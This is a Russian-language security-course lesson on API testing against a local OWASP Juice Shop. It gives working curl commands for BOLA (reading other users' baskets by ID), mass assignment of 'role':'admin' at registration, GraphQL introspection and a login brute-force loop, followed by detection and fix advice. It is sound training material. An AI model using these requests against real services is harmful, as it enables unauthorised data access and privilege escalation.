# 8.6 — API: BOLA, mass assignment, GraphQL

> **M08 · Этап 1 · 4 ч · 🟡 · артефакт:** `labs/m08-web-api/l06-api/`

## Цель

Научиться тестировать API как API: с токенами, IDOR/BOLA, массовым назначением и GraphQL.

## Результат

- BOLA в Juice Shop с двумя пользователями.
- Понимание mass assignment и почему `role` в JSON опасен.
- GraphQL introspection и поиск скрытых полей.

## Теория

- API-first: всё общение через JSON/GraphQL, часто без UI-защиты.
- BOLA/BFLA — доступ к объекту/функции без проверки прав.
- Mass assignment: сервер слепо применяет поля из JSON (`role`, `isAdmin`).
- GraphQL introspection открывает схему; отключение — не защита, а гигиена.
- Rate limiting и перебор: API часто позволяет быстро перебирать ID.
- Авторизация должна проверяться на каждом объекте, а не только на входе.

## Лаборатория

### 1. Логин и токен

```bash
curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@test.com","password":"Test1234!"}' | jq
```

Ожидаемо: `authentication.token` (JWT). Сохраните:

```bash
TOKEN=$(curl -s ... | jq -r .authentication.token)
```

### 2. BOLA

```bash
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:3000/rest/basket/1 | jq
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:3000/rest/basket/2 | jq
```

Ожидаемо: если второй ответ содержит чужую корзину — BOLA. Создайте второго пользователя и сравните.

### 3. Mass assignment

При регистрации добавьте лишние поля:

```bash
curl -s -X POST http://127.0.0.1:3000/api/Users \
  -H 'Content-Type: application/json' \
  -d '{"email":"evil@test.com","password":"Test1234!","role":"admin"}'
```

Ожидаемо: если `role` применился — критическая находка. Если сервер игнорирует — зафиксируйте как «не уязвимо».

### 4. GraphQL

```bash
curl -s -X POST http://127.0.0.1:3000/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{queryType{name} types{name fields{name}}}}"}' | jq '.data.__schema.types[0:5]'
```

Ожидаемо: схема. Ищите мутации и поля, недоступные в UI.

### 5. Rate limit

```bash
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST http://127.0.0.1:3000/rest/user/login \
    -H 'Content-Type: application/json' -d '{"email":"x@x","password":"wrong"}'
done | sort | uniq -c
```

Ожидаемо: если все `401` без `429` — rate limit отсутствует.

## Атака и защита

- **Атака:** перебор ID, mass assignment → админ, GraphQL → скрытые данные, отсутствие лимитов → брутфорс.
- **Детект:** последовательный перебор ID, аномальные поля в JSON, introspection-запросы, всплеск 401.
- **Фикс:** проверка владельца на каждом объекте, allowlist полей, отключить introspection в проде, rate limit, schema validation.

## Самопроверка

- [ ] Чем BOLA отличается от BFLA?
- [ ] Почему `role` в JSON — классика mass assignment?
- [ ] Зачем отключать introspection, если схема и так видна?
- [ ] Как отличить «нет доступа» от «объект не существует»?

## Дальше

[Контрольная M08](exam.md)
